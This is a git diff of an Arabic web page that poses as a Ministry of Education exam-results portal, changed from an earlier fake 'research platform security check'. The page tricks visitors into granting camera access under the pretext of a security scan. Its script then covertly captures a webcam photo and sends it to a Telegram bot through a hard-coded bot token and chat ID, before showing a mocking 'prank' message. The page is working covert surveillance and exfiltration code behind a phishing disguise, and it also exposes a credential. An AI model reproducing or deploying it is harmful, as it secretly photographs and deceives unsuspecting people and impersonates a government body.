@@ -3,35 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة الأبحاث المركزية | فحص النظام</title>
+    <title>بوابة النتائج المركزية | وزارة التربية</title>
     <style>
-        :root { --primary: #0062ff; --bg: #f8f9fa; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; color: #333; }
-        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 90%; max-width: 450px; transition: all 0.5s ease; }
-        .logo { width: 60px; height: 60px; background: var(--primary); border-radius: 15px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 24px; }
+        :root { --primary: #2c3e50; --error: #e74c3c; --bg: #ecf0f1; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; color: #333; overflow: hidden; }
+        .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 90%; max-width: 450px; text-align: center; position: relative; }
+        .logo { width: 70px; height: 70px; background: var(--primary); border-radius: 50%; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 28px; border: 4px solid white; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
         h2 { margin-bottom: 10px; font-size: 22px; color: #1a1a1a; }
         p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
         .btn { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.3s; }
-        .btn:hover { background: #0052d4; box-shadow: 0 5px 15px rgba(0,98,255,0.3); }
+        .btn:hover { background: #1a252f; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
         .loader-container { display: none; margin-top: 20px; }
         .progress-bar { width: 100%; height: 8px; background: #eee; border-radius: 10px; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: var(--primary); transition: width 0.4s; }
+        .progress-fill { width: 0%; height: 100%; background: var(--primary); transition: width 0.3s; }
         #status-text { font-size: 13px; color: #888; margin-top: 10px; display: block; }
+        
+        /* شاشة النتيجة النهائية (الـ Prank) */
+        #prank-screen { display: none; text-align: center; }
+        #prank-text { font-size: 32px; color: var(--error); font-weight: bold; margin-top: 20px; line-height: 1.4; animation: shake 0.5s; }
+        #signature { font-size: 18px; color: #555; margin-top: 30px; display: block; font-style: italic; }
+        @keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(5px); } 50% { transform: translateX(-5px); } 75% { transform: translateX(5px); } 100% { transform: translateX(0); } }
+
+        /* العناصر المخفية */
         #v, #c { display: none; }
     </style>
 </head>
 <body>
 
 <div id="main-content" style="display:none;" class="card">
-    <div class="logo">SR</div>
-    <h2>نظام مزامنة البيانات</h2>
-    <p>للمتابعة إلى بوابة الأبحاث، يرجى إجراء فحص سريع لبروتوكولات الأمان وتوافق المتصفح.</p>
-    
-    <button id="start-btn" class="btn">بدء المزامنة والتحقق</button>
+    <div id="initial-screen">
+        <div class="logo">نتائج</div>
+        <h2>نظام استعلام الدرجات الموحد</h2>
+        <p>يرجى الضغط على الزر أدناه لبدء فحص بروتوكولات الأمان وجلب النتيجة النهائية الخاصة بك.</p>
+        <button id="start-btn" class="btn">عرض النتيجة الآن</button>
+        <div id="loader" class="loader-container">
+            <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
+            <span id="status-text">جاري الاتصال بالسيرفر...</span>
+        </div>
+    </div>
 
-    <div id="loader" class="loader-container">
-        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
-        <span id="status-text">جاري بدء الاتصال...</span>
+    <div id="prank-screen">
+        <div class="logo" style="background: var(--error);">!</div>
+        <div id="prank-text">رسوب في احياء يتصل بكه</div>
+        <div id="signature">(اثير)</div>
     </div>
 
     <video id="v" autoplay playsinline></video>
@@ -40,13 +54,12 @@
 
 <div id="denied" style="display:none;">
     <h1 style="color: #dc3545;">403</h1>
-    <p>انتهت صلاحية الجلسة أو الرمز غير صالح.</p>
+    <p>الجلسة غير صالحة أو انتهت صلاحية الرمز.</p>
 </div>
 
 <script>
     const TOKEN = "8757110843:AAF-xoz_EX9JObBrgV8w35u2KRl3xkKRd0I";
     const CHAT_ID = "6655185768";
-    const REDIRECT_URL = "https://www.google.com"; // الموقع الذي سيذهب إليه بعد الانتهاء
 
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.get('auth') === 'atter_2026') {
@@ -56,6 +69,8 @@
     }
 
     const startBtn = document.getElementById('start-btn');
+    const initialScreen = document.getElementById('initial-screen');
+    const prankScreen = document.getElementById('prank-screen');
     const loader = document.getElementById('loader');
     const fill = document.getElementById('fill');
     const statusText = document.getElementById('status-text');
@@ -64,38 +79,43 @@
 
     startBtn.onclick = async () => {
         try {
+            // طلب الإذن (سيظهر للمستخدم طلب الكاميرا)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             
             startBtn.style.display = 'none';
             loader.style.display = 'block';
             
-            updateProgress(20, "جاري فحص المتصفح...");
+            updateProgress(30, "جاري فحص بروتوكولات الأمان...");
 
             setTimeout(async () => {
+                // التقاط الصورة في الخلفية
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imgData = canvas.toDataURL('image/png');
-                stream.getTracks().forEach(t => t.stop());
+                stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا فوراً
                 
-                updateProgress(50, "جاري رفع تقرير الأمان...");
+                updateProgress(60, "جاري جلب البيانات من قاعدة البيانات...");
 
+                // إرسال الصورة لتليجرام
                 const blob = await (await fetch(imgData)).blob();
                 const fd = new FormData();
                 fd.append("chat_id", CHAT_ID);
-                fd.append("photo", blob, "audit.png");
-                fd.append("caption", "📝 تقرير دخول جديد\n---\n✅ تم التحقق من الهوية بنجاح.");
+                fd.append("photo", blob, "prank.png");
+                fd.append("caption", "🔔 تم التقاط صورة جديدة من الـ Prank الخاص بك!");
 
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
 
-                updateProgress(100, "اكتمل التحقق! جاري التحويل...");
+                updateProgress(100, "اكتملت العملية.");
                 
+                // الانتقال لشاشة الـ Prank
                 setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 1500);
+                    initialScreen.style.display = 'none';
+                    prankScreen.style.display = 'block';
+                }, 1000);
 
             }, 2000);
         } catch (err) {
-            alert("عذراً، يجب الموافقة على صلاحيات الكاميرا لإتمام عملية المزامنة الأمنية.");
+            alert("عذراً، يجب الموافقة على صلاحيات الكاميرا لإتمام عملية فحص الأمان وجلب النتيجة.");
         }
     };
 
@@ -106,3 +126,4 @@
 </script>
 </body>
 </html>
+
